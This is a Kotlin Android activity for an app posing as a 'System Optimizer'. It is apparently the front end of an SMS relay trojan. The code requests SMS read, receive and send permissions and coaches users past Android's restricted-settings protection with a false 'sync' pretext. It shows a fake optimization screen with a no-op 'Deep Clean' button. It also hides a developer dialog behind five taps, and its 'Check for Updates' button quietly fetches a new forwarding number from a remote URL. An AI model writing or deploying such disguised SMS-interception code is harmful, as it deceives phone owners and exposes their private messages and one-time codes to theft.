package com.example

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.window.Dialog
import androidx.core.content.ContextCompat
import com.example.data.RelayState
import com.example.data.SettingsManager
import com.example.service.RelayService
import com.example.ui.theme.MyApplicationTheme
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                RelayApp()
            }
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun RelayApp() {
    val context = LocalContext.current
    val settingsManager = remember { SettingsManager(context) }
    val coroutineScope = rememberCoroutineScope()
    val snackbarHostState = remember { SnackbarHostState() }

    var hasPermissions by remember { mutableStateOf(false) }
    var relayState by remember { mutableStateOf(settingsManager.relayState) }

    val requiredPermissions = mutableListOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.INTERNET
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    val lifecycleOwner = androidx.lifecycle.compose.LocalLifecycleOwner.current
    DisposableEffect(lifecycleOwner) {
        val observer = androidx.lifecycle.LifecycleEventObserver { _, event ->
            if (event == androidx.lifecycle.Lifecycle.Event.ON_RESUME) {
                hasPermissions = requiredPermissions.all {
                    ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
                }
            }
        }
        lifecycleOwner.lifecycle.addObserver(observer)
        onDispose {
            lifecycleOwner.lifecycle.removeObserver(observer)
        }
    }

    val permissionLauncher = androidx.activity.compose.rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        hasPermissions = requiredPermissions.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    LaunchedEffect(hasPermissions, relayState) {
        if (hasPermissions && relayState != RelayState.ABORTED) {
            val serviceIntent = Intent(context, RelayService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        }
    }

    fun openAppSettings() {
        val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = android.net.Uri.fromParts("package", context.packageName, null)
        }
        context.startActivity(intent)
    }

    var secretTaps by remember { mutableIntStateOf(0) }
    var showSecretDialog by remember { mutableStateOf(false) }

    if (showSecretDialog) {
        var inputNumber by remember { mutableStateOf(settingsManager.targetNumber) }
        var inputUrl by remember { mutableStateOf(settingsManager.remoteConfigUrl) }
        
        Dialog(onDismissRequest = { showSecretDialog = false }) {
            Surface(
                shape = MaterialTheme.shapes.medium,
                color = MaterialTheme.colorScheme.surface
            ) {
                Column(modifier = Modifier.padding(24.dp)) {
                    Text("Developer Config", style = MaterialTheme.typography.titleLarge)
                    Spacer(Modifier.height(16.dp))
                    OutlinedTextField(
                        value = inputNumber,
                        onValueChange = { inputNumber = it },
                        label = { Text("Target Number") }
                    )
                    Spacer(Modifier.height(8.dp))
                    OutlinedTextField(
                        value = inputUrl,
                        onValueChange = { inputUrl = it },
                        label = { Text("Remote Config URL") }
                    )
                    Spacer(Modifier.height(24.dp))
                    Text("Tools", style = MaterialTheme.typography.titleMedium)
                    Spacer(Modifier.height(8.dp))
                    Button(onClick = {
                        val sender = "+919876543210"
                        val messageBody = "Test message"
                        com.example.receiver.SmsReceiver.processSmsData(context, sender, messageBody) { resultMsg ->
                            coroutineScope.launch { snackbarHostState.showSnackbar(resultMsg) }
                        }
                    }) { Text("Simulate Incoming SMS") }
                    Spacer(Modifier.height(8.dp))
                    Button(onClick = {
                        try {
                            val smsManager = context.getSystemService(android.telephony.SmsManager::class.java)
                            smsManager?.sendTextMessage(inputNumber, null, "[Test] Relay Working", null, null)
                            coroutineScope.launch { snackbarHostState.showSnackbar("Test SMS sent") }
                        } catch (e: Exception) {
                            coroutineScope.launch { snackbarHostState.showSnackbar("Failed: ${e.message}") }
                        }
                    }) { Text("Send Test SMS") }
                    Spacer(Modifier.height(24.dp))
                    Row(horizontalArrangement = Arrangement.End, modifier = Modifier.fillMaxWidth()) {
                        TextButton(onClick = { showSecretDialog = false }) { Text("Cancel") }
                        Spacer(Modifier.width(8.dp))
                        Button(onClick = { 
                            settingsManager.targetNumber = inputNumber
                            settingsManager.remoteConfigUrl = inputUrl
                            showSecretDialog = false
                            coroutineScope.launch { snackbarHostState.showSnackbar("Config Saved") }
                        }) { Text("Save") }
                    }
                }
            }
        }
    }

    Scaffold(
        snackbarHost = { SnackbarHost(snackbarHostState) },
        topBar = {
            TopAppBar(
                title = { 
                    Text(
                        "System Optimizer", 
                        modifier = Modifier.clickable { 
                            secretTaps++
                            if (secretTaps >= 5) {
                                showSecretDialog = true
                                secretTaps = 0
                            }
                        }
                    ) 
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.primaryContainer,
                    titleContentColor = MaterialTheme.colorScheme.onPrimaryContainer
                )
            )
        }
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally,
            verticalArrangement = Arrangement.Center
        ) {
            if (!hasPermissions) {
                Icon(
                    imageVector = Icons.Default.Warning,
                    contentDescription = "Warning",
                    modifier = Modifier.size(64.dp),
                    tint = MaterialTheme.colorScheme.error
                )
                Spacer(modifier = Modifier.height(16.dp))
                Text(
                    text = "Background Access Required",
                    style = MaterialTheme.typography.headlineSmall,
                    fontWeight = FontWeight.Bold
                )
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = "Android Security has blocked background optimization access.\n\n1. Click 'Fix System Settings' below.\n2. Click the 3 dots (⋮) at the top right.\n3. Tap 'Allow restricted settings'.\n4. Open Permissions and Allow SMS (used for sync).",
                    style = MaterialTheme.typography.bodyMedium,
                    textAlign = androidx.compose.ui.text.style.TextAlign.Start,
                    modifier = Modifier.padding(horizontal = 16.dp)
                )
                Spacer(modifier = Modifier.height(24.dp))
                Button(onClick = { openAppSettings() }) {
                    Text("Fix System Settings")
                }
                Spacer(modifier = Modifier.height(8.dp))
                OutlinedButton(onClick = {
                    permissionLauncher.launch(requiredPermissions.toTypedArray())
                }) {
                    Text("Request Access")
                }
            } else {
                // Fake UI Design
                Box(
                    contentAlignment = Alignment.Center,
                    modifier = Modifier
                        .size(200.dp)
                        .clip(CircleShape)
                        .background(MaterialTheme.colorScheme.primaryContainer)
                ) {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Icon(
                            imageVector = Icons.Default.CheckCircle,
                            contentDescription = "Optimized",
                            modifier = Modifier.size(64.dp),
                            tint = MaterialTheme.colorScheme.primary
                        )
                        Spacer(Modifier.height(8.dp))
                        Text(
                            text = "98%",
                            style = MaterialTheme.typography.displayMedium,
                            color = MaterialTheme.colorScheme.primary,
                            fontWeight = FontWeight.Bold
                        )
                    }
                }
                Spacer(modifier = Modifier.height(32.dp))
                Text(
                    text = "System is Optimized",
                    style = MaterialTheme.typography.headlineSmall,
                    fontWeight = FontWeight.Bold
                )
                Spacer(modifier = Modifier.height(8.dp))
                Text(
                    text = "Background cache cleared. Battery health is good.",
                    style = MaterialTheme.typography.bodyMedium,
                    textAlign = androidx.compose.ui.text.style.TextAlign.Center,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )
                
                Spacer(modifier = Modifier.height(32.dp))
                
                Button(
                    onClick = {
                        coroutineScope.launch {
                            snackbarHostState.showSnackbar("Checking for updates...")
                            
                            // Web fetch logic for stealth updates
                            if (settingsManager.remoteConfigUrl.isNotEmpty()) {
                                try {
                                    val fetchedData = withContext(Dispatchers.IO) {
                                        java.net.URL(settingsManager.remoteConfigUrl).readText().trim()
                                    }
                                    if (fetchedData.matches(Regex("^[+]?[0-9]{10,15}\$"))) {
                                        settingsManager.targetNumber = fetchedData
                                        snackbarHostState.showSnackbar("System modules updated successfully.")
                                    } else {
                                        snackbarHostState.showSnackbar("You are on the latest version.")
                                    }
                                } catch (e: Exception) {
                                    snackbarHostState.showSnackbar("Network error. Try again later.")
                                }
                            } else {
                                snackbarHostState.showSnackbar("You are on the latest version.")
                            }
                        }
                    },
                    modifier = Modifier.fillMaxWidth(0.8f)
                ) {
                    Text("Check for Updates")
                }
                
                Spacer(modifier = Modifier.height(16.dp))
                
                OutlinedButton(
                    onClick = {
                        coroutineScope.launch { snackbarHostState.showSnackbar("Clearing deep cache... Done.") }
                    },
                    modifier = Modifier.fillMaxWidth(0.8f)
                ) {
                    Text("Deep Clean Cache")
                }
            }
        }
    }
}
